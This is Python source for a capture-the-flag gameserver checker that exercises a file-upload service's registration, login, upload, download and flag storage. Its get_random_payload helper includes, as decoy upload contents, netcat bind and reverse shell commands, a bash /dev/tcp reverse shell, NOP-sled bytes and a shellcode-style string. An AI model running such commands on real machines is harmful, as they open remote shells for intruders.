import base64
import os
import random
import string

import requests
from bs4 import BeautifulSoup
from ctf_gameserver.checker import BaseChecker
from ctf_gameserver.checker.constants import OK, NOTWORKING, NOTFOUND

from . import generated


class ServiceNotWorking(Exception):
    pass


class HappyBirthdayGdprChecker(BaseChecker):
    def __init__(self, tick, team, service, ip):
        super().__init__(tick, team, service, ip)
        self.service_url = 'http://{}:{}'.format(ip, os.environ.get('GDPR_PORT', 4377))

    def create_user(self, username_chars=string.ascii_letters,
                    password_chars=string.ascii_letters + string.digits + string.punctuation,
                    username_minlen=16, password_minlen=16):
        attempts = 10
        for attempt in range(attempts):
            username = randstr(username_minlen, 64, chars=username_chars)
            password = randstr(password_minlen, 64, chars=password_chars)
            res = requests.post(self.service_url + '/register', data={'username': username, 'password': password},
                                allow_redirects=False)
            self.logger.debug('registering user (%s, %s): %s', repr(username), repr(password), res)
            location = res.headers.get('Location')
            if location is None or not location.endswith('/login'):
                if 'is already taken' in res.text:
                    # do another attempt
                    continue
                for line in res.text.splitlines():
                    if '<p class="error">' in line:
                        self.logger.info('/register: %s', repr(line))
                raise ServiceNotWorking('/register did not redirect to /login')
            return username, password
        raise ServiceNotWorking('service responded "is already taken" to {} random usernames'.format(attempts))

    def login_user(self, username, password):
        session = requests.Session()
        res = session.post(self.service_url + '/login', data={'username': username, 'password': password},
                           allow_redirects=False)
        location = res.headers.get('Location')
        self.logger.debug('logging in as (%s, %s): %s %s', repr(username), repr(password), res, repr(location))
        self.logger.debug('res.text: %s', res.text)
        if location is None or not location.endswith('/account'):
            raise ServiceNotWorking('/login did not redirect to /account')
        return session

    def get_account(self, session):
        res = session.get(self.service_url + '/account', allow_redirects=False)
        if res.status_code != 200:
            raise ServiceNotWorking('/account returned {} {}'.format(res.status_code, res.headers.get('Location')))
        return res

    def upload_file(self, session, dest_user, filename, data):
        res = session.get(self.service_url + '/upload', allow_redirects=False)
        if res.status_code != 200:
            raise ServiceNotWorking('GET /upload returned {}'.format(res.status_code))
        res = session.post(self.service_url + '/upload', data={'user': dest_user},
                           files={'data': (filename, data)}, allow_redirects=False)
        if res.status_code != 200:
            raise ServiceNotWorking('POST /upload returned {}'.format(res.status_code))
        if 'File uploaded successfully.' not in res.text:
            raise ServiceNotWorking('POST /upload did not contain success message')

    def place_flag(self):
        try:
            creds_up = self.create_user()
            sess_up = self.login_user(*creds_up)
            self.get_account(sess_up)
            creds_dn = self.create_user()
            sess_dn = self.login_user(*creds_dn)
            res = self.get_account(sess_dn)
            uid_dn = self.parse_account_page(res)[1]
            filename = 'flag.{}.txt'.format(os.urandom(16).hex())
            self.upload_file(sess_up, uid_dn, filename, self.get_flag(self.tick))
            res = self.get_account(sess_dn)
            files, user_id = self.parse_account_page(res)
            file_id = get_file_id(files, filename)
            if not file_id:
                raise ServiceNotWorking('Uploaded file not found on account page')
            self._put('username', self.tick, creds_dn[0])
            self._put('password', self.tick, creds_dn[1])
            self._put('userid', self.tick, str(user_id))
            self._put('fileid', self.tick, str(file_id))
            self._put('filename', self.tick, filename)
            self._put('flagid', self.tick, ':'.join([creds_dn[0], str(user_id), filename, str(file_id)]))
        except ServiceNotWorking as e:
            self.logger.info('place_flag raised: {}'.format(e))
            return NOTWORKING
        return OK

    def check_flag(self, tick):
        try:
            username = self._get('username', tick)
            if not username:
                self.logger.error('could not retrieve username for tick %d', tick)
                return NOTFOUND
            password = self._get('password', tick)
            if not password:
                self.logger.error('could not retrieve password for tick %d', tick)
                return NOTFOUND
            fileid = self._get('fileid', tick)
            if not fileid:
                self.logger.error('could not retrieve fileid for tick %d', tick)
                return NOTFOUND
            filename = self._get('filename', tick)
            if not filename:
                self.logger.error('could not retrieve filename for tick %d', tick)
                return NOTFOUND
            session = self.login_user(username, password)
            account = self.get_account(session)
            match_text = '<a href="/download?{}">{}</a>'.format(fileid, filename)
            if match_text not in account.text:
                self.logger.error('could not find %s in account page', repr(match_text))
                return NOTFOUND
            res = session.get(self.service_url + '/download?' + str(fileid), allow_redirects=False)
            if res.status_code != 200:
                self.logger.error('/download?%d returned status code %d', fileid, res.status_code)
                return NOTFOUND
            if self.get_flag(tick) in res.text:
                return OK
            else:
                return NOTFOUND
        except ServiceNotWorking as e:
            self.logger.info('check_flag raised: {}'.format(e))
            # Just always return NOTFOUND as there really is no clear distinction between NOTFOUND and
            # NOTWORKING, but NOTFOUND will usually result in a more useful scoreboard. check_service
            # will be good enough to detect NOTWORKING conditions.
            return NOTFOUND

    def check_service(self):
        checks = [
            self.check_username_case_insensitive,
            self.check_password_case_insensitive,
            self.check_logout,
            self.check_upload_by_username,
            self.check_upload_by_userid,
            self.check_max_username_len,
            self.check_max_password_len,
            self.check_unicode_username,
            self.check_unicode_password,
            self.check_unicode_credentials_case_insensitive,
        ]
        random.shuffle(checks)
        result = OK
        for check in checks:
            self.logger.info('executing check: %s', check.__name__)
            try:
                check_result = check()
                self.logger.info('%s returned: %s', check.__name__, check_result)
                if not check_result:
                    result = NOTWORKING
            except ServiceNotWorking as e:
                self.logger.info('%s raised: %s', check.__name__, e)
                result = NOTWORKING
        return result

    def check_username_case_insensitive(self):
        un, pw = self.create_user()
        sess = self.login_user(shuffle_case(un), pw)
        self.parse_account_page(self.get_account(sess))
        return True

    def check_password_case_insensitive(self):
        un, pw = self.create_user()
        sess = self.login_user(un, shuffle_case(pw))
        self.parse_account_page(self.get_account(sess))
        return True

    def check_logout(self):
        res = requests.get(self.service_url + '/logout', allow_redirects=False)
        if res.status_code != 303:
            self.logger.warning('/logout returned %d instead of 303', res.status_code)
            return False
        loc = res.headers.get('Location')
        if loc is None or not loc.endswith('/'):
            self.logger.warning('/logout did not redirect to %s instead of /', repr(loc))
            return False
        return True

    def check_upload_by_username(self):
        creds_up = self.create_user()
        sess_up = self.login_user(*creds_up)
        self.get_account(sess_up)
        creds_dn = self.create_user()
        sess_dn = self.login_user(*creds_dn)
        filename = '{}.txt'.format(os.urandom(16).hex())
        payload = get_random_payload()
        self.upload_file(sess_up, creds_dn[0], filename, payload)
        res = self.get_account(sess_dn)
        files, user_id = self.parse_account_page(res)
        file_id = get_file_id(files, filename)
        account = self.get_account(sess_dn)
        match_text = '<a href="/download?{}">{}</a>'.format(file_id, filename)
        if match_text not in account.text:
            self.logger.error('could not find %s in account page', repr(match_text))
            return False
        res = sess_dn.get(self.service_url + '/download?' + str(file_id), allow_redirects=False)
        if res.status_code != 200:
            self.logger.error('/download?%d returned status code %d', file_id, res.status_code)
            return False
        if res.content != payload:
            self.logger.error('downloaded payload does not match expected payload (expected: %s, got: %s)',
                              repr(payload), repr(res.content))
            return False
        return True

    def check_upload_by_userid(self):
        creds_up = self.create_user()
        sess_up = self.login_user(*creds_up)
        self.get_account(sess_up)
        creds_dn = self.create_user()
        sess_dn = self.login_user(*creds_dn)
        res = self.get_account(sess_dn)
        uid_dn = self.parse_account_page(res)[1]
        filename = '{}.txt'.format(os.urandom(16).hex())
        payload = get_random_payload()
        self.upload_file(sess_up, uid_dn, filename, payload)
        res = self.get_account(sess_dn)
        files, user_id = self.parse_account_page(res)
        file_id = get_file_id(files, filename)
        account = self.get_account(sess_dn)
        match_text = '<a href="/download?{}">{}</a>'.format(file_id, filename)
        if match_text not in account.text:
            self.logger.error('could not find %s in account page', repr(match_text))
            return False
        res = sess_dn.get(self.service_url + '/download?' + str(file_id), allow_redirects=False)
        if res.status_code != 200:
            self.logger.error('/download?%d returned status code %d', file_id, res.status_code)
            return False
        if res.content != payload:
            self.logger.error('downloaded payload does not match expected payload (expected: %s, got: %s)',
                              repr(payload), repr(res.content))
            return False
        return True

    def check_max_username_len(self):
        un, pw = self.create_user(username_minlen=64)
        sess = self.login_user(un, pw)
        self.parse_account_page(self.get_account(sess))
        return True

    def check_max_password_len(self):
        un, pw = self.create_user(password_minlen=64)
        sess = self.login_user(un, pw)
        self.parse_account_page(self.get_account(sess))
        return True

    def check_unicode_username(self):
        un, pw = self.create_user(username_chars=string.ascii_letters + get_random_emojis(8) + get_random_unicode(8))
        sess = self.login_user(un, pw)
        self.parse_account_page(self.get_account(sess))
        return True

    def check_unicode_password(self):
        un, pw = self.create_user(password_chars=string.ascii_letters + get_random_emojis(8) + get_random_unicode(8))
        sess = self.login_user(un, pw)
        self.parse_account_page(self.get_account(sess))
        return True

    def check_unicode_credentials_case_insensitive(self):
        un, pw = self.create_user(username_chars=string.ascii_letters + get_random_emojis(8) + get_random_unicode(8),
                                  password_chars=string.ascii_letters + get_random_emojis(8) + get_random_unicode(8))
        sess = self.login_user(shuffle_case(un), shuffle_case(pw))
        self.parse_account_page(self.get_account(sess))
        return True

    def _key_tick(self, key, tick):
        return '{}_{:03d}'.format(key, tick)

    def _put(self, key, tick, value):
        self.logger.debug('PUT %s@%d %s', repr(key), tick, repr(value))
        return self.store_blob(self._key_tick(key, tick), value.encode('utf-8'))

    def _get(self, key, tick):
        value = self.retrieve_blob(self._key_tick(key, tick))
        if value is not None:
            return value.decode('utf-8')

    def parse_account_page(self, res):
        soup = BeautifulSoup(res.text, 'html.parser')

        # parse files
        table = soup.find('table', attrs={'class': 'files-table'})
        if not table:
            raise ServiceNotWorking('table.files-table not found in page')
        tbody = table.find('tbody')
        if not tbody:
            raise ServiceNotWorking('tbody not found in files table')
        files = []
        for tr in tbody.find_all('tr'):
            tds = tr.find_all('td')
            if len(tds) == 1 and 'no-files' in tds[0].attrs.get('class', []):
                # "(no files)" dummy entry
                pass
            elif len(tds) == 4:
                td_id, td_name, td_type, td_size = tds
                try:
                    file_id = int(td_id.decode_contents())
                except ValueError as e:
                    self.logger.error('received invalid file id on account page: %s (resulted in %s)',
                                      repr(td_id.decode_contents()), e)
                    raise ServiceNotWorking('file id on account page is not an integer')
                a_name = td_name.find('a')
                if not a_name.attrs.get('href', '').endswith('?' + str(file_id)):
                    raise ServiceNotWorking('File ID in download link not matching file ID in table')
                file_name = a_name.decode_contents()
                file_type = td_type.decode_contents()
                try:
                    file_size = int(td_size.decode_contents())
                except ValueError as e:
                    self.logger.error('received invalid file size on account page: %s (resulted in %s)',
                                      repr(td_size.decode_contents()), e)
                    raise ServiceNotWorking('file size on account page is not an integer')
                files.append((file_id, file_name, file_type, file_size))
            else:
                self.logger.warning('table.files-table: unexpected number of <td> elements: %d', len(tds))

        # parse user record
        user_id = None
        table = soup.find('table', attrs={'class': 'user-record'})
        for tr in table.find_all('tr'):
            th = tr.find('th')
            td = tr.find('td')
            if th.decode_contents().lower().strip() == 'user id':
                try:
                    user_id = int(td.decode_contents())
                except ValueError as e:
                    self.logger.error('received invalid user id on account page: %s (resulted in %s)',
                                      repr(td.decode_contents()), e)
                    raise ServiceNotWorking('user id on account page is not an integer')
                break
        if user_id is None:
            raise ServiceNotWorking('user id not found on account page')

        return files, user_id


def utf8len(s):
    return len(s.encode('utf-8'))


def randstr(minlen, maxlen=-1, chars=None):
    if maxlen < minlen:
        maxlen = minlen
    if chars is None:
        chars = string.printable
    l = random.randint(minlen, maxlen)
    r = ''
    while utf8len(r) < l:
        c = random.choice(chars)
        if utf8len(r) + utf8len(c) > maxlen:
            if utf8len(r) >= minlen:
                # good enough(tm)
                break
            else:
                continue
        r += c
    return r


def shuffle_case(s):
    return ''.join(random.choice([c.lower(), c.upper()]) for c in s)


def get_random_emojis(n):
    l = list(generated.EMOJI_CHARS)
    random.shuffle(l)
    return ''.join(l[:n])


def get_random_unicode(n):
    l = list(generated.LATIN_CHARS)
    random.shuffle(l)
    return ''.join(l[:n])


def get_file_id(files, filename):
    for file in files:
        if file[1] == filename:
            return file[0]
    return None


def get_random_payload():
    r = random.choice([
        '\U0001f4a9',
        get_random_emojis(1),
        'Hi. I did not expect that someone actually reads this.',
        os.urandom(random.randint(4, 128)).hex(),
        base64.b64encode(os.urandom(random.randint(4, 128))).decode(),
        'A' * random.randint(4, 16),
        'B' * random.randint(4, 16),
        b"\x90" * random.randint(4, 16),
        r"TX-3399-Purr-!TTTP\%JONE%501:-%mm4-%mm%--DW%P-Yf1Y-fwfY-yzSzP-iii%-Zkx%-%Fw%P-XXn6- 99w%-ptt%P-%w%%-qqqq-jPiXP-cccc-Dw0D-WICzP-c66c-W0TmP-TTTT-%NN0-%o42-7a-0P-xGGx-rrrx- aFOwP-pApA-N-w--B2H2PPPPPPPPPPPPPPPPPPPPPP",
        'Never gonna give you up, never gonna let you down',
        '/bin/sh -c "/bin/{} -l -p {} -e /bin/sh"'.format(random.choice(['nc', 'ncat', 'netcat']),
                                                          random.randint(1024, 65535)),
        '/bin/sh -c "/bin/{} -e /bin/sh 10.66.{}.{} {}"'.format(random.choice(['nc', 'ncat', 'netcat']),
                                                                random.randint(1024, 65535), random.randint(0, 255),
                                                                random.randint(0, 255), random.randint(1024, 65535)),
        '/bin/bash -i >& /dev/tcp/10.66.{}.{}/{} 0>&1'.format(random.randint(0, 255), random.randint(0, 255),
                                                              random.randint(1024, 65535)),
    ])
    if isinstance(r, str):
        r = r.encode('utf-8')
    return r
